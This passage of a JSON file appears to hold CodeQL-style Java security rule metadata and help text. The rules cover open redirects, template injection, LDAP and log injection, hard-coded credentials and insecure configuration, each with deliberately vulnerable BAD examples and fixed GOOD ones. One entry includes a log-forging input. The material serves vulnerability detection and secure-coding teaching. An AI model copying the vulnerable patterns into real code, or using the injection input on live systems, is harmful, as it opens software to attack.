    "help": "# Apache Struts development mode enabled\nTurning Apache Struts' development mode configuration on while deploying applications to production environments can lead to remote code execution.\n\n\n## Recommendation\nAn application should disable the development mode at the time of deployment.\n\n\n## Example\nThe following example shows a \\`struts.xml\\` file with \\`struts.devmode\\` enabled.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE struts PUBLIC\n\t\"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\"\n\t\"http://struts.apache.org/dtds/struts-2.3.dtd\">\n\n<struts>\n    <constant name=\"struts.enable.DynamicMethodInvocation\" value=\"true\" />\n    <constant name=\"struts.devMode\" value=\"true\" />\n    <constant name=\"struts.i18n.encoding\" value=\"utf-8\" />\n    <include file=\"login.xml\" />\n</struts>\n\n```\nThis can be easily corrected by setting the value of the \\`struts.devmode\\` parameter to false.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE struts PUBLIC\n\t\"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\"\n\t\"http://struts.apache.org/dtds/struts-2.3.dtd\">\n\n<struts>\n    <constant name=\"struts.enable.DynamicMethodInvocation\" value=\"true\" />\n    <constant name=\"struts.devMode\" value=\"false\" />\n    <constant name=\"struts.i18n.encoding\" value=\"utf-8\"></constant>\n    <include file=\"login.xml\" />\n</struts>\n```\n\n## References\n* Apache Struts: [Struts development mode configuration](https://struts.apache.org/core-developers/development-mode.html)\n* Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  },
  "java/unvalidated-url-redirection": {
    "name": "URL redirection from remote source",
    "description": "URL redirection based on unvalidated user-input may cause redirection to malicious web sites.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "high",
    "id": "java/unvalidated-url-redirection",
    "tags": [
      "security",
      "external/cwe/cwe-601"
    ],
    "filename": "e5f163f2-UrlRedirect",
    "language": "java",
    "help": "# URL redirection from remote source\nDirectly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\nIf this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is on the same host as the current page.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:\n\n\n```java\npublic class UrlRedirect extends HttpServlet {\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    // BAD: a request parameter is incorporated without validation into a URL redirect\n    response.sendRedirect(request.getParameter(\"target\"));\n  }\n}\n```\nOne way to remedy the problem is to validate the user input against a known fixed string before doing the redirection:\n\n\n```java\npublic class UrlRedirect extends HttpServlet {\n  private static final List<String> VALID_REDIRECTS = Arrays.asList(\n    \"http://cwe.mitre.org/data/definitions/601.html\",\n    \"http://cwe.mitre.org/data/definitions/79.html\"\n  );\n\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    // GOOD: the request parameter is validated against a known list of strings\n    String target = request.getParameter(\"target\");\n    if (VALID_REDIRECTS.contains(target)) {\n        response.sendRedirect(target);\n    } else {\n        response.sendRedirect(\"/error.html\");\n    }\n  }\n}\n```\nAlternatively, we can check that the target URL does not redirect to a different host by checking that the URL is either relative or on a known good host:\n\n\n```java\npublic class UrlRedirect extends HttpServlet {\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    try {\n      String urlString = request.getParameter(\"page\");\n      URI url = new URI(urlString);\n\n      if (!url.isAbsolute()) {\n        response.sendRedirect(url.toString()); // GOOD: The redirect is to a relative URL\n      }\n\n      if (\"example.org\".equals(url.getHost())) {\n        response.sendRedirect(url.toString()); // GOOD: The redirect is to a known host\n      }\n    } catch (URISyntaxException e) {\n        // handle exception\n    }\n  }\n}\n```\nNote that as written, the above code will allow redirects to URLs on `example.com`, which is harmless but perhaps not intended. You can substitute your own domain (if known) for `example.com` to prevent this.\n\n\n## References\n* OWASP: [ Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Microsoft Docs: [Preventing Open Redirection Attacks (C\\#)](https://docs.microsoft.com/en-us/aspnet/mvc/overview/security/preventing-open-redirection-attacks).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "java/server-side-template-injection": {
    "name": "Server-side template injection",
    "description": "Untrusted input interpreted as a template can lead to remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/server-side-template-injection",
    "tags": [
      "security",
      "external/cwe/cwe-1336",
      "external/cwe/cwe-094"
    ],
    "filename": "b76141d8-TemplateInjection",
    "language": "java",
    "help": "# Server-side template injection\nTemplate injection occurs when user input is embedded in a template's code in an unsafe manner. An attacker can use native template syntax to inject a malicious payload into a template, which is then executed server-side. This permits the attacker to run arbitrary code in the server's context.\n\n\n## Recommendation\nTo fix this, ensure that untrusted input is not used as part of a template's code. If the application requirements do not allow this, use a sandboxed environment where access to unsafe attributes and methods is prohibited.\n\n\n## Example\nIn the example given below, an untrusted HTTP parameter `code` is used as a Velocity template string. This can lead to remote code execution.\n\n\n```java\n@Controller\npublic class VelocitySSTI {\n\n\t@GetMapping(value = \"bad\")\n\tpublic void bad(HttpServletRequest request) {\n\t\tVelocity.init();\n\n\t\tString code = request.getParameter(\"code\");\n\n\t\tVelocityContext context = new VelocityContext();\n\n\t\tcontext.put(\"name\", \"Velocity\");\n\t\tcontext.put(\"project\", \"Jakarta\");\n\n\t\tStringWriter w = new StringWriter();\n\t\t// evaluate( Context context, Writer out, String logTag, String instring )\n\t\tVelocity.evaluate(context, w, \"mystring\", code);\n\t}\n}\n\n```\nIn the next example, the problem is avoided by using a fixed template string `s`. Since the template's code is not attacker-controlled in this case, this solution prevents the execution of untrusted code.\n\n\n```java\n@Controller\npublic class VelocitySSTI {\n\n\t@GetMapping(value = \"good\")\n\tpublic void good(HttpServletRequest request) {\n\t\tVelocity.init();\n\t\tVelocityContext context = new VelocityContext();\n\n\t\tcontext.put(\"name\", \"Velocity\");\n\t\tcontext.put(\"project\", \"Jakarta\");\n\n\t\tString s = \"We are using $project $name to render this.\";\n\t\tStringWriter w = new StringWriter();\n\t\tVelocity.evaluate(context, w, \"mystring\", s);\n\t\tSystem.out.println(\" string : \" + w);\n\t}\n}\n\n```\n\n## References\n* Portswigger: [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection).\n* Common Weakness Enumeration: [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/hardcoded-credential-api-call": {
    "name": "Hard-coded credential in API call",
    "description": "Using a hard-coded credential in a call to a sensitive Java API may compromise security.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "medium",
    "id": "java/hardcoded-credential-api-call",
    "tags": [
      "security",
      "external/cwe/cwe-798"
    ],
    "filename": "1e2d7ec8-HardcodedCredentialsApiCall",
    "language": "java",
    "help": "# Hard-coded credential in API call\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\n\n## Example\nThe following code example connects to a database using a hard-coded user name and password:\n\n\n```java\nprivate static final String p = \"123456\"; // hard-coded credential\n\npublic static void main(String[] args) throws SQLException {\n    String url = \"jdbc:mysql://localhost/test\";\n    String u = \"admin\"; // hard-coded credential\n\n    getConn(url, u, p);\n}\n\npublic static void getConn(String url, String v, String q) throws SQLException {\n    DriverManager.getConnection(url, v, q); // sensitive call\n}\n\n```\nInstead, the user name and password could be supplied through environment variables, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "java/ldap-injection": {
    "name": "LDAP query built from user-controlled sources",
    "description": "Building an LDAP query from user-controlled sources is vulnerable to insertion of malicious LDAP code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/ldap-injection",
    "tags": [
      "security",
      "external/cwe/cwe-090"
    ],
    "filename": "7d927efd-LdapInjection",
    "language": "java",
    "help": "# LDAP query built from user-controlled sources\nIf an LDAP query is built using string concatenation, and the components of the concatenation include user input, a user is likely to be able to run malicious LDAP queries.\n\n\n## Recommendation\nIf user input must be included in an LDAP query, it should be escaped to avoid a malicious user providing special characters that change the meaning of the query. If possible build the LDAP query using framework helper methods, for example from Spring's `LdapQueryBuilder` and `LdapNameBuilder`, instead of string concatenation. Alternatively, escape user input using an appropriate LDAP encoding method, for example: `encodeForLDAP` or `encodeForDN` from OWASP ESAPI, `LdapEncoder.filterEncode` or `LdapEncoder.nameEncode` from Spring LDAP, or `Filter.encodeValue` from UnboundID library.\n\n\n## Example\nIn the following examples, the code accepts an \"organization name\" and a \"username\" from the user, which it uses to query LDAP.\n\nThe first example concatenates the unvalidated and unencoded user input directly into both the DN (Distinguished Name) and the search filter used for the LDAP query. A malicious user could provide special characters to change the meaning of these queries, and search for a completely different set of values. The LDAP query is executed using Java JNDI API.\n\nThe second example uses the OWASP ESAPI library to encode the user values before they are included in the DN and search filters. This ensures the meaning of the query cannot be changed by a malicious user.\n\n\n```java\nimport javax.naming.directory.DirContext;\nimport org.owasp.esapi.Encoder;\nimport org.owasp.esapi.reference.DefaultEncoder;\n\npublic void ldapQueryBad(HttpServletRequest request, DirContext ctx) throws NamingException {\n  String organizationName = request.getParameter(\"organization_name\");\n  String username = request.getParameter(\"username\");\n\n  // BAD: User input used in DN (Distinguished Name) without encoding\n  String dn = \"OU=People,O=\" + organizationName;\n\n  // BAD: User input used in search filter without encoding\n  String filter = \"username=\" + userName;\n\n  ctx.search(dn, filter, new SearchControls());\n}\n\npublic void ldapQueryGood(HttpServletRequest request, DirContext ctx) throws NamingException {\n  String organizationName = request.getParameter(\"organization_name\");\n  String username = request.getParameter(\"username\");\n\n  // ESAPI encoder\n  Encoder encoder = DefaultEncoder.getInstance();\n\n  // GOOD: Organization name is encoded before being used in DN\n  String safeOrganizationName = encoder.encodeForDN(organizationName);\n  String safeDn = \"OU=People,O=\" + safeOrganizationName;\n\n  // GOOD: User input is encoded before being used in search filter\n  String safeUsername = encoder.encodeForLDAP(username);\n  String safeFilter = \"username=\" + safeUsername;\n  \n  ctx.search(safeDn, safeFilter, new SearchControls());\n}\n```\nThe third example uses Spring `LdapQueryBuilder` to build an LDAP query. In addition to simplifying the building of complex search parameters, it also provides proper escaping of any unsafe characters in search filters. The DN is built using `LdapNameBuilder`, which also provides proper escaping.\n\n\n```java\nimport static org.springframework.ldap.query.LdapQueryBuilder.query;\nimport org.springframework.ldap.support.LdapNameBuilder;\n\npublic void ldapQueryGood(@RequestParam String organizationName, @RequestParam String username) {\n  // GOOD: Organization name is encoded before being used in DN\n  String safeDn = LdapNameBuilder.newInstance()\n    .add(\"O\", organizationName)\n    .add(\"OU=People\")\n    .build().toString();\n\n  // GOOD: User input is encoded before being used in search filter\n  LdapQuery query = query()\n    .base(safeDn)\n    .where(\"username\").is(username);\n\n  ldapTemplate.search(query, new AttributeCheckAttributesMapper());\n}\n```\nThe fourth example uses `UnboundID` classes, `Filter` and `DN`, to construct a safe filter and base DN.\n\n\n```java\nimport com.unboundid.ldap.sdk.LDAPConnection;\nimport com.unboundid.ldap.sdk.DN;\nimport com.unboundid.ldap.sdk.RDN;\nimport com.unboundid.ldap.sdk.Filter;\n\npublic void ldapQueryGood(HttpServletRequest request, LDAPConnection c) {\n  String organizationName = request.getParameter(\"organization_name\");\n  String username = request.getParameter(\"username\");\n\n  // GOOD: Organization name is encoded before being used in DN\n  DN safeDn = new DN(new RDN(\"OU\", \"People\"), new RDN(\"O\", organizationName));\n\n  // GOOD: User input is encoded before being used in search filter\n  Filter safeFilter = Filter.createEqualityFilter(\"username\", username);\n  \n  c.search(safeDn.toString(), SearchScope.ONE, safeFilter);\n}\n```\nThe fifth example shows how to build a safe filter and DN using the Apache LDAP API.\n\n\n```java\nimport org.apache.directory.ldap.client.api.LdapConnection;\nimport org.apache.directory.api.ldap.model.name.Dn;\nimport org.apache.directory.api.ldap.model.name.Rdn;\nimport org.apache.directory.api.ldap.model.message.SearchRequest;\nimport org.apache.directory.api.ldap.model.message.SearchRequestImpl;\nimport static org.apache.directory.ldap.client.api.search.FilterBuilder.equal;\n\npublic void ldapQueryGood(HttpServletRequest request, LdapConnection c) {\n  String organizationName = request.getParameter(\"organization_name\");\n  String username = request.getParameter(\"username\");\n\n  // GOOD: Organization name is encoded before being used in DN\n  Dn safeDn = new Dn(new Rdn(\"OU\", \"People\"), new Rdn(\"O\", organizationName));\n\n  // GOOD: User input is encoded before being used in search filter\n  String safeFilter = equal(\"username\", username);\n  \n  SearchRequest searchRequest = new SearchRequestImpl();\n  searchRequest.setBase(safeDn);\n  searchRequest.setFilter(safeFilter);\n  c.search(searchRequest);\n}\n```\n\n## References\n* OWASP: [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html).\n* OWASP ESAPI: [OWASP ESAPI](https://owasp.org/www-project-enterprise-security-api/).\n* Spring LdapQueryBuilder doc: [LdapQueryBuilder](https://docs.spring.io/spring-ldap/docs/current/apidocs/org/springframework/ldap/query/LdapQueryBuilder.html).\n* Spring LdapNameBuilder doc: [LdapNameBuilder](https://docs.spring.io/spring-ldap/docs/current/apidocs/org/springframework/ldap/support/LdapNameBuilder.html).\n* UnboundID: [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n"
  },
  "java/log-injection": {
    "name": "Log Injection",
    "description": "Building log entries from user-controlled data may allow insertion of forged log entries by malicious users.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "java/log-injection",
    "tags": [
      "security",
      "external/cwe/cwe-117"
    ],
    "filename": "ad7580f4-LogInjection",
    "language": "java",
    "help": "# Log Injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input creating the appearance of multiple log entries. This can include unescaped new-line characters, or HTML or other markup.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are plain text then line breaks should be removed from user input, using for example `String replace(char oldChar, char newChar)` or similar. Care should also be taken that user input is clearly marked in log entries, and that a malicious user cannot cause confusion in other ways.\n\nFor log entries that will be displayed in HTML, user input should be HTML encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using `logger.warn` (from `org.slf4j.Logger`). In the first case (`/bad` endpoint), the username is logged without any sanitization. If a malicious user provides `Guest'%0AUser:'Admin` as a username parameter, the log entry will be split into two separate lines, where the first line will be `User:'Guest'` and the second one will be `User:'Admin'`.\n\n\n```java\npackage com.example.restservice;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class LogInjection {\n\n    private final Logger log = LoggerFactory.getLogger(LogInjection.class);\n\n    // /bad?username=Guest'%0AUser:'Admin\n    @GetMapping(\"/bad\")\n    public String bad(@RequestParam(value = \"username\", defaultValue = \"name\") String username) {\n        log.warn(\"User:'{}'\", username);\n        // The logging call above would result in multiple log entries as shown below:\n        // User:'Guest'\n        // User:'Admin'\n        return username;\n    }\n}\n\n\n```\nIn the second example (`/good` endpoint), `matches()` is used to ensure the user input only has alphanumeric characters. If a malicious user provides \\`Guest'%0AUser:'Admin\\` as a username parameter, the log entry will not be logged at all, preventing the injection.\n\n\n```java\npackage com.example.restservice;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\npublic class LogInjection {\n\n    private final Logger log = LoggerFactory.getLogger(LogInjection.class);\n\n    // /good?username=Guest'%0AUser:'Admin\n    @GetMapping(\"/good\")\n    public String good(@RequestParam(value = \"username\", defaultValue = \"name\") String username) {\n        // The regex check here, allows only alphanumeric characters to pass.\n        // Hence, does not result in log injection\n        if (username.matches(\"\\\\w*\")) {\n            log.warn(\"User:'{}'\", username);\n\n            return username;\n        }\n    }\n}\n\n```\n\n## References\n* OWASP: [Log Injection](https://owasp.org/www-community/attacks/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n"
  },
  "java/insecure-ldaps-endpoint": {
    "name": "Insecure LDAPS Endpoint Configuration",
    "description": "Java application configured to disable LDAPS endpoint identification does not validate the SSL certificate to properly ensure that it is actually associated with that host.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/insecure-ldaps-endpoint",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-297"
    ],
    "filename": "316490d0-InsecureLdapEndpoint",
    "language": "java",
    "help": "# Insecure LDAPS Endpoint Configuration\nJava versions 8u181 or greater have enabled LDAPS endpoint identification by default. Nowadays infrastructure services like LDAP are commonly deployed behind load balancers therefore the LDAP server name can be different from the FQDN of the LDAPS endpoint. If a service certificate does not properly contain a matching DNS name as part of the certificate, Java will reject it by default.\n\nInstead of addressing the issue properly by having a compliant certificate deployed, frequently developers simply disable the LDAPS endpoint check.\n\nFailing to validate the certificate makes the SSL session susceptible to a man-in-the-middle attack. This query checks whether the LDAPS endpoint check is disabled in system properties.\n\n\n## Recommendation\nReplace any non-conforming LDAP server certificates to include a DNS name in the subjectAltName field of the certificate that matches the FQDN of the service.\n\n\n## Example\nThe following two examples show two ways of configuring LDAPS endpoint. In the 'BAD' case, endpoint check is disabled. In the 'GOOD' case, endpoint check is left enabled through the default Java configuration.\n\n\n```java\npublic class InsecureLdapEndpoint {\n    public Hashtable<String, String> createConnectionEnv() {\n        Hashtable<String, String> env = new Hashtable<String, String>();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL, \"ldaps://ad.your-server.com:636\");\n\n        env.put(Context.SECURITY_AUTHENTICATION, \"simple\");\n        env.put(Context.SECURITY_PRINCIPAL, \"username\");\n        env.put(Context.SECURITY_CREDENTIALS, \"secpassword\");\n\n        // BAD - Test configuration with disabled SSL endpoint check.\n        {\n            System.setProperty(\"com.sun.jndi.ldap.object.disableEndpointIdentification\", \"true\");\n        }\n\n        return env;\n    }\n}\n\n```\n\n```java\npublic class InsecureLdapEndpoint2 {\n    public Hashtable<String, String> createConnectionEnv() {\n        Hashtable<String, String> env = new Hashtable<String, String>();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL, \"ldaps://ad.your-server.com:636\");\n\n        env.put(Context.SECURITY_AUTHENTICATION, \"simple\");\n        env.put(Context.SECURITY_PRINCIPAL, \"username\");\n        env.put(Context.SECURITY_CREDENTIALS, \"secpassword\");\n\n        // GOOD - No configuration to disable SSL endpoint check since it is enabled by default.\n        {\n        }\n\n        return env;\n    }\n}\n\n```\n\n## References\n* Oracle Java 8 Update 181 (8u181): [Endpoint identification enabled on LDAPS connections](https://www.java.com/en/download/help/release_changes.html)\n* IBM: [Fix this LDAP SSL error](https://www.ibm.com/support/pages/how-do-i-fix-ldap-ssl-error-%E2%80%9Cjavasecuritycertcertificateexception-no-subject-alternative-names-present%E2%80%9D-websphere-application-server)\n* Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).\n"
  },
  "java/world-writable-file-read": {
    "name": "Reading from a world writable file",
    "description": "Reading from a file which is set as world writable is dangerous because the file may be modified or removed by external actors.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "high",
    "id": "java/world-writable-file-read",
    "tags": [
      "security",
      "external/cwe/cwe-732"
    ],
    "filename": "3761032e-ReadingFromWorldWritableFile",
    "language": "java",
    "help": "# Reading from a world writable file\nReading from a world-writable file is dangerous on a multi-user system because other users may be able to affect program execution by modifying or deleting the file.\n\n\n## Recommendation\nDo not make files explicitly world writable unless the file is intended to be written by multiple users on a multi-user system. In many cases, the file may only need to be writable for the current user.\n\nFor some file systems, there may be alternatives to setting the file to be world writable. For example, POSIX file systems support \"groups\" which may be used to ensure that only subset of all the users can write to the file. Access Control Lists (ACLs) are available for many operating system and file system combinations, and can provide fine-grained read and write support without resorting to world writable permissions.\n\n\n## Example\nIn the following example, we are loading some configuration parameters from a file:\n\n```java\n\nprivate void readConfig(File configFile) {\n  if (!configFile.exists()) {\n    // Create an empty config file\n    configFile.createNewFile();\n    // Make the file writable for all\n    configFile.setWritable(true, false);\n  }\n  // Now read the config\n  loadConfig(configFile);\n}\n\n```\nIf the configuration file does not yet exist, an empty file is created. Creating an empty file can simplify the later code and is a convenience for the user. However, by setting the file to be world writable, we allow any user on the system to modify the configuration, not just the current user. If there may be untrusted users on the system, this is potentially dangerous.\n\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [FIO01-J. Create files with appropriate access permissions](https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions).\n* Common Weakness Enumeration: [CWE-732](https://cwe.mitre.org/data/definitions/732.html).\n"
  },
  "java/improper-validation-of-array-index-code-specified": {
    "name": "Improper validation of code-specified array index",
    "description": "Using a code-specified value as an index to an array, without proper validation, can lead to index out of bound exceptions.",
    "kind": "path-problem",
    "problem.severity": "recommendation",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "java/improper-validation-of-array-index-code-specified",
    "tags": [
      "security",
      "external/cwe/cwe-129"
    ],
    "filename": "e2275c9e-ImproperValidationOfArrayIndexCodeSpecified",
    "language": "java",
    "help": "# Improper validation of code-specified array index\nUsing a hard-coded or randomly provided value as the index to an array access can cause that array access to throw an `ArrayIndexOutOfBoundsException` if the value is outside the bounds of that array.\n\nThis problem occurs when a literal value, or a value generated using the `Random`, is used as an index for an array access operation. If one or more of the range of values produced by the random operation, or the fixed value of the literal, is outside the bounds of the array then this can cause an `ArrayIndexOutOfBoundsException`.\n\n\n## Recommendation\nIf the index is a literal value, then the literal value may need to be modified to specify an index that is guaranteed to lie within the bounds of the array. Alternatively, the literal value may represent a default value that was never intended to be used in the array access, in which case the logic should be modified to ensure the default value is never used.\n\nFor indices that flow from randomly generated values, either the random operation should be modified to generate a value that is guaranteed to be within the bounds of the array, or the array access should be protected by suitable conditional checks that verify the index is smaller than the length and larger than or equal to zero.\n\n\n## Example\nThe following program searches through an array to find the index at which some search text matches:\n\n\n```java\npublic class ImproperValidationOfArrayIndex extends HttpServlet {\n\n  protected void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws ServletException, IOException {\n    // Search for products in productDescriptions that match the search term\n    String searchTerm = request.getParameter(\"productSearchTerm\");\n    int foundProductID = -1;\n    for (int i = 0; i < productDescriptions.length; i++) {\n      if (productDescriptions[i].contains(searchTerm)) {\n        // Found matching product\n        foundProductID = i;\n        break;\n      }\n    }\n\n    // BAD We may not have found a product in which case the index would be -1\n    response.getWriter().write(productDescriptions[foundProductID]);\n\n    if (foundProductID >= 0) {\n      // GOOD We have checked we found a product first\n      response.getWriter().write(productDescriptions[foundProductID]);\n    } else {\n      response.getWriter().write(\"No product found\");\n    }\n  }\n}\n```\nIf the search text is not found, `foundProductID` is set to the default value - specified as `-1`. In the first access, `foundProductID` is used without checking whether the index is `-1`. This code can therefore throw a `ArrayIndexOutOfBoundsException` if the search text is not found.\n\nIn the second case, the array access is protected by a conditional that verifies the index is greater than or equal to zero. This ensures that an `ArrayIndexOutOfBoundsException` cannot be thrown.\n\n\n## References\n* Java API Specification: [ArrayIndexOutOfBoundsException](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/ArrayIndexOutOfBoundsException.html).\n* Common Weakness Enumeration: [CWE-129](https://cwe.mitre.org/data/definitions/129.html).\n"
  },
  "java/spring-unvalidated-url-redirection": {
    "name": "Spring url redirection from remote source",
    "description": "Spring url redirection based on unvalidated user-input may cause redirection to malicious web sites.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/spring-unvalidated-url-redirection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-601"
    ],
    "filename": "c4db1da2-SpringUrlRedirect",
    "language": "java",
    "help": "# Spring url redirection from remote source\nDirectly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\n\n## Example\nThe following examples show the bad case and the good case respectively. The `bad` methods show an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks. In the `good1` method, it is shown how to solve this problem by verifying whether the user input is a known fixed string beginning.\n\n\n```java\nimport javax.servlet.http.HttpServletResponse;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.servlet.ModelAndView;\nimport org.springframework.web.servlet.view.RedirectView;\n\n@Controller\npublic class SpringUrlRedirect {\n\n    private final static String VALID_REDIRECT = \"http://127.0.0.1\";\n\n    @GetMapping(\"url1\")\n    public RedirectView bad1(String redirectUrl, HttpServletResponse response) throws Exception {\n        RedirectView rv = new RedirectView();\n        rv.setUrl(redirectUrl);\n        return rv;\n    }\n\n    @GetMapping(\"url2\")\n    public String bad2(String redirectUrl) {\n        String url = \"redirect:\" + redirectUrl;\n        return url;\n    }\n\n    @GetMapping(\"url3\")\n    public RedirectView bad3(String redirectUrl) {\n        RedirectView rv = new RedirectView(redirectUrl);\n        return rv;\n    }\n\n    @GetMapping(\"url4\")\n    public ModelAndView bad4(String redirectUrl) {\n        return new ModelAndView(\"redirect:\" + redirectUrl);\n    }\n\n    @GetMapping(\"url5\")\n    public ResponseEntity<Void> bad5(String redirectUrl) {\n        return ResponseEntity.status(HttpStatus.FOUND)\n                .location(URI.create(redirectUrl))\n                .build();\n    }\n\n    @GetMapping(\"url6\")\n    public ResponseEntity<Void> bad6(String redirectUrl) {\n        HttpHeaders httpHeaders = new HttpHeaders();\n        httpHeaders.setLocation(URI.create(redirectUrl));\n\n        return new ResponseEntity<>(httpHeaders, HttpStatus.SEE_OTHER);\n    }\n\n    @GetMapping(\"url7\")\n    public ResponseEntity<Void> bad7(String redirectUrl) {\n        HttpHeaders httpHeaders = new HttpHeaders();\n        httpHeaders.add(\"Location\", redirectUrl);\n\n        return ResponseEntity.status(HttpStatus.SEE_OTHER).headers(httpHeaders).build();\n    }\n\n    @GetMapping(\"url8\")\n    public RedirectView good1(String redirectUrl) {\n        RedirectView rv = new RedirectView();\n        if (redirectUrl.startsWith(VALID_REDIRECT)){\n            rv.setUrl(redirectUrl);\n        }else {\n            rv.setUrl(VALID_REDIRECT);\n        }\n        return rv;\n    }\n}\n\n```\n\n## References\n* A Guide To Spring Redirects: [Spring Redirects](https://www.baeldung.com/spring-redirect-and-forward).\n* Url redirection - attack and defense: [Url Redirection](https://www.virtuesecurity.com/kb/url-redirection-attack-and-defense/).\n* How to redirect to an external URL from Spring Boot REST Controller (Post/Redirect/Get pattern)?: [ResponseEntity Redirection](https://fullstackdeveloper.guru/2021/03/12/how-to-redirect-to-an-external-url-from-spring-boot-rest-controller/).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "java/hardcoded-credential-sensitive-call": {
    "name": "Hard-coded credential in sensitive call",
    "description": "Using a hard-coded credential in a sensitive call may compromise security.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "low",
    "id": "java/hardcoded-credential-sensitive-call",
    "tags": [
      "security",
      "external/cwe/cwe-798"
    ],
    "filename": "1e2d7ec8-HardcodedCredentialsSourceCall",
    "language": "java",
